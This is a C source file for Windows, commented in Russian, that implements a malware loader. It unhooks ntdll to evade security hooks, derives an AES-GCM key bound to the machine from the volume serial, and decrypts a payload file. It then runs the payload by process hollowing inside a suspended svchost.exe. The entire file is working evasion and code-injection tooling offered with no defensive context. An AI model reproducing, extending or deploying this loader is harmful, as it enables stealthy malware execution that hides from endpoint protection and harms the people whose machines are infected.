#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <bcrypt.h>
#include <stdio.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ntdll.lib")

void DeriveKey(BYTE* outKey) {
    DWORD volumeSerial = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &volumeSerial, NULL, NULL, NULL, 0);
    
    BYTE seed[sizeof(DWORD) + 8];
    memcpy(seed, &volumeSerial, sizeof(DWORD));
    memcpy(seed + sizeof(DWORD), "MyS@lt!2", 8);
    
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_HASH_HANDLE hHash;
    
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    BCryptHashData(hHash, seed, sizeof(seed), 0);
    BCryptFinishHash(hHash, outKey, KEY_SIZE, 0);
    
    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
}

// Определяев
void RefreshNtdll() {
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                              GENERIC_READ,
                              FILE_SHARE_READ,
                              NULL,
                              OPEN_EXISTING,
                              0,
                              NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Ошибка открытия файла ntdll.dll\n");
        return;
    }
    
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        printf("Ошибка создания mapping\n");
        return;
    }
    
    LPVOID pCleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pCleanNtdll) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        printf("Ошибка отображения файла\n");
        return;
    }
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        UnmapViewOfFile(pCleanNtdll);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        printf("Не удалось получить модуль ntdll.dll\n");
        return;
    }
    
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDosHeader->e_lfanew);
    
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders) + i;
        
        if (!(pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            continue;
        }
        
        DWORD_PTR pTargetAddr = (DWORD_PTR)hNtdll + pSection->VirtualAddress;
        DWORD_PTR pSourceAddr = (DWORD_PTR)pCleanNtdll + pSection->VirtualAddress;
        SIZE_T sectionSize = pSection->SizeOfRawData;
        
        DWORD oldProtect;
        if (VirtualProtect((LPVOID)pTargetAddr, sectionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            memcpy((LPVOID)pTargetAddr, (LPVOID)pSourceAddr, sectionSize);
            VirtualProtect((LPVOID)pTargetAddr, sectionSize, oldProtect, &oldProtect);
        }
    }
    
    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    
    printf("Ntdll unhooked успешно\n");
}

// вшиваемчся 
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

#define TAG_SIZE 16
#define IV_SIZE 12
#define KEY_SIZE 32

// Структура блока релокаций
typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type   : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

void PerformRelocation(PBYTE pPayload, PVOID pRemoteImage, PIMAGE_NT_HEADERS pNtHeaders) {
    DWORD_PTR delta = (DWORD_PTR)pRemoteImage - pNtHeaders->OptionalHeader.ImageBase;

    if (delta == 0) return;

    IMAGE_DATA_DIRECTORY relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir.Size == 0) return;

    PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pPayload + relocDir.VirtualAddress);

    while (pReloc->VirtualAddress != 0) {
        DWORD entriesCount = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY pEntries = (PBASE_RELOCATION_ENTRY)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < entriesCount; i++) {
            if (pEntries[i].Type == 0) continue;

            PVOID pAddressToPatch = (PVOID)(pPayload + pReloc->VirtualAddress + pEntries[i].Offset);

#ifdef _WIN64
            if (pEntries[i].Type == IMAGE_REL_BASED_DIR64) {
                *(DWORD64*)pAddressToPatch += (DWORD64)delta;
            }
#else
            if (pEntries[i].Type == IMAGE_REL_BASED_HIGHLOW) {
                *(DWORD*)pAddressToPatch += (DWORD)delta;
            }
#endif
        }
        pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
    }
}

void decryptAndRun(const char* encryptedPath, BYTE* key) {
    // Чтение файла в память
    FILE* f = fopen(encryptedPath, "rb");
    if (!f) {
        printf("Ошибка открытия файла %s\n", encryptedPath);
        return;
    }
    
    BYTE iv[IV_SIZE];
    BYTE tag[TAG_SIZE];
    if (fread(iv, 1, IV_SIZE, f) != IV_SIZE) {
        printf("Ошибка чтения IV\n");
        fclose(f);
        return;
    }
    if (fread(tag, 1, TAG_SIZE, f) != TAG_SIZE) {
        printf("Ошибка чтения tag\n");
        fclose(f);
        return;
    }
    
    fseek(f, 0, SEEK_END);
    DWORD cipherSize = ftell(f) - IV_SIZE - TAG_SIZE;
    fseek(f, IV_SIZE + TAG_SIZE, SEEK_SET);
    
    BYTE* data = (BYTE*)malloc(cipherSize);
    if (!data) {
        printf("Ошибка выделения памяти\n");
        fclose(f);
        return;
    }
    
    if (fread(data, 1, cipherSize, f) != cipherSize) {
        printf("Ошибка чтения данных\n");
        free(data);
        fclose(f);
        return;
    }
    fclose(f);

    // Расшифровка
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) {
        printf("Ошибка открытия алгоритма AES\n");
        free(data);
        return;
    }
    
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) {
        printf("Ошибка установки режима GCM\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        free(data);
        return;
    }
    
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, KEY_SIZE, 0) != 0) {
        printf("Ошибка генерации ключа\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        free(data);
        return;
    }

    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = iv;
    authInfo.cbNonce = IV_SIZE;
    authInfo.pbTag = tag;
    authInfo.cbTag = TAG_SIZE;

    DWORD cbResult = 0;
    NTSTATUS decryptStatus = BCryptDecrypt(hKey, data, cipherSize, &authInfo, NULL, 0, data, cipherSize, &cbResult, 0);
    if (decryptStatus != 0) {
        printf("Ошибка дешифровки: 0x%X\n", decryptStatus);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        free(data);
        return;
    }

    // Process Hollowing
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char targetProcess[] = "C:\\Windows\\System32\\svchost.exe";

    if (CreateProcessA(NULL, targetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)data;
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            printf("Неверный DOS заголовок\n");
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            free(data);
            return;
        }
        
        PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(data + dosHeader->e_lfanew);
        if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
            printf("Неверный NT заголовок\n");
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            free(data);
            return;
        }

        pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
        if (NtUnmapViewOfSection) {
            NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, (PVOID)ntHeader->OptionalHeader.ImageBase);
            if (status != STATUS_SUCCESS && status != STATUS_NOT_MAPPED_VIEW) {
                printf("NtUnmapViewOfSection failed: 0x%X\n", status);
            }
        }

        // Выделяем память в целевом процессе
        PVOID remoteImage = VirtualAllocEx(pi.hProcess, (PVOID)ntHeader->OptionalHeader.ImageBase, 
                                          ntHeader->OptionalHeader.SizeOfImage, 
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        // Если не удалось выделить по нужному адресу, пробуем без указания адреса
        if (!remoteImage) {
            remoteImage = VirtualAllocEx(pi.hProcess, NULL, 
                                        ntHeader->OptionalHeader.SizeOfImage, 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }
        
        if (!remoteImage) {
            printf("Ошибка выделения памяти в целевом процессе: %d\n", GetLastError());
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            free(data);
            return;
        }

        // буфер здесь
        PBYTE localBuffer = (PBYTE)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, 
                                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        if (!localBuffer) {
            printf("Ошибка выделения локального буфера\n");
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            free(data);
            return;
        }

        // Копируем заголовки
        memcpy(localBuffer, data, ntHeader->OptionalHeader.SizeOfHeaders);
        
        // Копируем секции в локальный буфер
        for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)(data + dosHeader->e_lfanew + 
                                            sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
            
            // Проверка
            if (section->PointerToRawData + section->SizeOfRawData > cipherSize ||
                section->VirtualAddress + section->SizeOfRawData > ntHeader->OptionalHeader.SizeOfImage) {
                printf("Некорректные данные секции\n");
                VirtualFree(localBuffer, 0, MEM_RELEASE);
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                BCryptDestroyKey(hKey);
                BCryptCloseAlgorithmProvider(hAlg, 0);
                free(data);
                return;
            }
            
            memcpy(localBuffer + section->VirtualAddress, 
                   data + section->PointerToRawData, 
                   section->SizeOfRawData);
        }

        // релокация
        PerformRelocation(localBuffer, remoteImage, ntHeader);

        // образ
        if (!WriteProcessMemory(pi.hProcess, remoteImage, localBuffer, 
                              ntHeader->OptionalHeader.SizeOfImage, NULL)) {
            printf("Ошибка записи в процесс: %d\n", GetLastError());
            VirtualFree(localBuffer, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            free(data);
            return;
        }

        // Обновление ImageBase в PEB целевого процесса
#ifdef _WIN64
        PROCESS_BASIC_INFORMATION pbi;
        typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
        pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
        
        if (NtQueryInformationProcess) {
            ULONG returnLength = 0;
            NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
            if (NT_SUCCESS(status) && pbi.PebBaseAddress) {
                DWORD64 imageBase = (DWORD64)remoteImage;
                WriteProcessMemory(pi.hProcess, (PVOID)((DWORD64)pbi.PebBaseAddress + 0x10), 
                                 &imageBase, sizeof(DWORD64), NULL);
            }
        }
#else
        PROCESS_BASIC_INFORMATION pbi;
        typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
        pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
        
        if (NtQueryInformationProcess) {
            ULONG returnLength = 0;
            NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
            if (NT_SUCCESS(status) && pbi.PebBaseAddress) {
                DWORD imageBase = (DWORD)remoteImage;
                WriteProcessMemory(pi.hProcess, (PVOID)((DWORD)pbi.PebBaseAddress + 0x8), 
                                 &imageBase, sizeof(DWORD), NULL);
            }
        }
#endif

        // Подменяем контекст + запуск
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);
        
#ifdef _WIN64
        ctx.Rcx = (DWORD64)((BYTE*)remoteImage + ntHeader->OptionalHeader.AddressOfEntryPoint);
#else
        ctx.Eax = (DWORD)((BYTE*)remoteImage + ntHeader->OptionalHeader.AddressOfEntryPoint);
#endif

        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);
        
        printf("Процесс запущен и пропатчен в памяти с релокацией.\n");

        // Очистка локального буфера
        VirtualFree(localBuffer, 0, MEM_RELEASE);
        
        // Закрываем хэндлы
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    free(data);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
}

// Точка входа 
int main() {
    RefreshNtdll(); 

    BYTE key[KEY_SIZE];
    DeriveKey(key); // HWID

    decryptAndRun("protected.bin", key);

    SecureZeroMemory(key, KEY_SIZE); 
    
    return 0;
}
